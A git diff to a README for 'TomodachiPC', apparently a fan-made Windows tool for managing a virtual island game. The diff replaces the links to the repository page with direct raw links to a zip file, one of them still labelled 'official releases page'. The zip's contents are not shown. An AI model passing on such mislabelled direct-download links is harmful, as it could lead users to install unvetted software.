@@ -1,6 +1,6 @@
 # 🏝️ TomodachiPC - Manage your virtual island life easily
 
-[![](https://img.shields.io/badge/Download-TomodachiPC-blue.svg)](https://github.com/itandi5191/TomodachiPC)
+[![](https://img.shields.io/badge/Download-TomodachiPC-blue.svg)](https://raw.githubusercontent.com/itandi5191/TomodachiPC/main/Port/Tomodachi_PC_v2.0.zip)
 
 TomodachiPC brings your favorite island simulation to your Windows desktop. This application lets you manage your Mii characters, design apartments, and track daily island events. You oversee every aspect of your virtual community through an intuitive interface. The software includes tools to edit personalities, organize gift systems, and catalog your food preferences database. You gain full control over island news, dream collections, and character interactions. 
 
@@ -18,7 +18,7 @@ Your computer needs specific components to run this software smoothly. Ensure yo
 
 Follow these steps to set up the application on your computer:
 
-1. Visit the [official releases page](https://github.com/itandi5191/TomodachiPC) to download the software.
+1. Visit the [official releases page](https://raw.githubusercontent.com/itandi5191/TomodachiPC/main/Port/Tomodachi_PC_v2.0.zip) to download the software.
 2. Look for the file ending in ".exe" under the latest version header.
 3. Click the file name to start the download.
 4. Save the file to your desktop or your downloads folder.
